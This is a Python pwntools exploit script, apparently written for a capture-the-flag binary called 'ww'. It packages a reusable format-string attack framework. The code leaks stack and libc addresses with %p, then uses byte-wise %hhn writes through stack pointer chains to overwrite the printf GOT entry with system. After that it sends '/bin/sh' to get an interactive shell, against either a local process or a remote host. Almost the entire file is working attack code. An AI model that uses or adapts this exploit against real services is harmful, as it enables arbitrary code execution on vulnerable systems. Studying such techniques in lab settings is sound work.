#!/usr/bin/python

from pwn import *

class FMTAttackFrame(object):
    """FMT Attack Frame
    
    Anyone can complete a fmt exp in a short time use this framework with few configurations.
               
                      ...
               |----------------|
               |  libc_main_ret | 
               |----------------|
               |                |
    addr1 ---->|----------------|
               |      addr2     |------ oft1
               |----------------|     |
               |                |     |
               |----------------|     |
                        .             |
                        .             |
                        .             |
    addr2 ---->|----------------|     |
               |      addr3     |<----- oft2
               |----------------|     |
                        .             |
                        .             |
                        .             |
   addr3' ---->|----------------|     |
               |  GOT_ADR+00    |<----- oft3
               |----------------|
               |  GOT_ADR+01    |
               |----------------|
                        .
                        .
                        .
               |----------------|
               |  GOT_ADR+07    |
               |----------------|
                       ...
    
    """
    
    def __init__(self,
                 io, elf, libc, atk_chain_adr1, atk_chain_adr2, atk_chain_adr3, libc_start_main_ret, libc_start_main_ret_oft, fmt_adr, fmt_oft, target_got_addr, syscall, callback):
        """Init
        
        Args:
            io:
            elf:
            libc:
            atk_chain_adr1: 
            atk_chain_adr2:
            atk_chain_adr3:
            libc_start_main_ret:
            libc_start_main_ret_oft:
            fmt_adr:
            fmt_oft:
            target_got_addr:
            syscall:
            callback: callback function, you can add function like this: callback(fmt)
        """
        self.io = io
        self.elf = elf
        self.libc = libc
        self.atk_chain_adr1 = atk_chain_adr1
        self.atk_chain_adr2 = atk_chain_adr2
        self.atk_chain_adr3 = atk_chain_adr3
        self.libc_start_main_ret = libc_start_main_ret
        self.libc_start_main_ret_oft = libc_start_main_ret_oft
        self.fmt_adr = fmt_adr
        self.fmt_oft = fmt_oft
        self.target_got_addr = target_got_addr
        self.syscall = syscall
        self.callback = callback
        
        self.atk_chain1_oft, self.atk_chain2_oft, self.atk_chain3_oft = self.GetOffset()
        self.libc_base = self.GetLibcBase()
        self.target_address = self.GetTargetAddress()
        
        
        
    def GetOffset(self):
        """Get the 3 address chains's offset in the stack
        
        Get the 3 address chains's offset in the stack
        
        Args:
        
        Returns:
            return 3 offsets for addr1, addr2 and addr3
            
        """
        addr1 = self.atk_chain_adr1
        addr2 = self.atk_chain_adr2
        addr3 = (self.atk_chain_adr3 >> 0x8) << 0x8
        addr  = self.fmt_adr
        oft   = self.fmt_oft
        oft1  = (addr1 - addr) / 0x8 + oft
        oft2  = (addr2 - addr) / 0x8 + oft
        oft3  = (addr3 - addr) / 0x8 + oft
        
        # vul to leak argv0
        fmt = '#%{}$p#%{}$p#'.format(oft1, oft2)
        self.callback(self.io, fmt)
        #
        self.io.recvuntil('#')
        addr2 = int(self.io.recvuntil('#').strip('#'), 16)
        addr3 = (int(self.io.recvuntil('#').strip('#'), 16) >> 8) << 8
        oft3  = (addr3 - addr2) / 0x8 + oft2

        return (oft1, oft2, oft3)
    
    def GetLibcBase(self):
        """Leak the libc Base
        
        """
        oft = (self.libc_start_main_ret - self.fmt_adr) / 0x8 + self.fmt_oft
        fmt = '#%{}$p#'.format(oft)
        self.callback(self.io, fmt)
        self.io.recvuntil('#')
        libc_start_main = int(self.io.recvuntil('#').strip('#'), 16) - self.libc_start_main_ret_oft 
        libc_base = libc_start_main - self.libc.symbols['__libc_start_main']
        
        return libc_base
    
    def GetTargetAddress(self):
        target_address = self.libc_base + self.libc.symbols[self.syscall]
        raw_input('1')
        print 'target:'+hex(target_address)
        return target_address
        
    def PaddingStack(self):
        # step 1
        offset1 = self.atk_chain1_oft
        offset2 = self.atk_chain2_oft
        offset3 = self.atk_chain3_oft
        target_got = self.target_got_addr
        target_address = self.target_address
        do_fmt = self.callback
        
        target_got -= 1
        for i in range(8):
            target_got += 1
            for j in range(8):
            # change offset2
                if j+i*8 == 0:
                    fmt = '%{}$hhn'.format(offset1)
                else:
                    fmt = '%{}c%{}$hhn'.format(j+i*8, offset1)
                do_fmt(self.io, fmt)
            
                # change offset3
                T = 0xFF<<(j*8)
                len = (target_got & T)>>(j*8)
                if len == 0:
                    fmt = '%{}$hhn'.format(offset2)
                else:
                    fmt = '%{}c%{}$hhn'.format(len, offset2)
                
                do_fmt(self.io, fmt)
            
        # step 2 : change got table 
        # prepare fmt
        if ord(p64(target_address)[0]) == 0:
            d = [0x100]
        else:
            d = [ord(p64(target_address)[0])]
        for i in range(7):
            v = ord(p64(target_address)[i+1])- ord(p64(target_address)[i])
            if v <= 0:
                v += 0x100
            d.append(v)
            
        fmt = ''
        t = 0
        for v in d:
            fmt += '%{}c%{}$hhn'.format(v, offset3+t)
            #fmt += ',{}:%{}$p'.format(offset3+t+1, offset3+t+1)
            t+=1
            #print fmt
                
        print fmt
        do_fmt(self.io, fmt)
        

def callback(io, fmt):
    """ you need to add your code here
    
    eg: io.sendline(fmt)
    """
    edit(io, 0, fmt)
    execute(io, 0)
    
    pass
    
##################################################################
# Add the logic code here for the target elf
##################################################################
def add(io, len=9000, fmt='test'):
    io.recvuntil('Exit\n')
    io.sendline('1')
    io.recvuntil('cmd(<10000):\n')
    io.sendline(str(len))
    io.recvuntil('Please enter you shell cmd:')
    io.sendline(fmt)

def execute(io, id=0):
    io.recvuntil('Exit\n')
    io.sendline('3')
    io.recvuntil('Please enter the shell id:')
    io.sendline(str(id))
    io.recvuntil('\n')

def edit(io, id=0, fmt='test'):
    io.recvuntil('Exit\n')
    io.sendline('5')
    io.recvuntil('Please enter the id (based on list)')
    io.sendline(str(id))
    io.recvuntil('Please enter the new shell:')
    io.sendline(fmt)
##################################################################

def get_fmt_offset(len):
    fmt = ''
    for i in range(len):
        fmt += ',{}:%{}$p'.format(i+1,i+1)
    return fmt+'***'

	        
if __name__ == '__main__':
    target_elf = './ww'
    target_libc = './libc-2.23.so'
    #target_libc = '/lib/x86_64-linux-gnu/libc.so.6'
    
    target_host = '172.16.5.11'
    target_port = '5066'

    #context.log_level = 'debug'
    context.terminal = ['tmux', 'splitw', '-v']

    #gdb.attach(proc.pidof(p)[0])
    
    elf = ELF(target_elf)
    libc = ELF(target_libc)
    
    LOCAL = True 
    
    if LOCAL:
        io = process(target_elf, env={'LD_PRELOAD':target_libc})
        #io = process(target_elf)
        #gdb.attach(io, '''b *0x0000000000400DC3
        #b *0x0000000000400DC8''')
    else:
        io = remote(target_host, target_port)
    
    fmt  = get_fmt_offset(12)
    add(io, 9000, fmt)
    
    execute(io, 0)
    
    log.info(io.recvuntil('***'))

    #io, elf, libc, atk_chain_adr1, atk_chain_adr2, atk_chain_adr3, libc_start_main_ret, libc_start_main_ret_oft, fmt_adr, fmt_oft, target_got_addr, syscall, callback
    #(oft1, oft2, oft3) = GetOffset(0x7fffffffed78, 0x7fffffffee48, 0x7fffffffefc3, 0x7fffffffecf8, 11)
    atk_chain_adr1 = 0x7ffd8f164c28 
    atk_chain_adr2 = 0x7ffd8f164cf8
    atk_chain_adr3 = 0x7ffd8f164fd4
    libc_start_main_ret = 0x7ffd8f164c18 
    libc_start_main_ret_oft = 240
    fmt_adr = 0x7ffd8f164b80 
    fmt_oft = 6
    target_got_addr = elf.got['printf']
    syscall = 'system'
    
    fmt_attack = FMTAttackFrame(io, elf, libc, atk_chain_adr1, atk_chain_adr2, atk_chain_adr3, libc_start_main_ret, libc_start_main_ret_oft, fmt_adr, fmt_oft, target_got_addr, syscall, callback)
    fmt_attack.PaddingStack()
    
    log.info('successfully replace got')
    raw_input('go?')
    
    #get your shell, add your code
    callback(io, '/bin/sh')
    io.interactive()
    
    pass
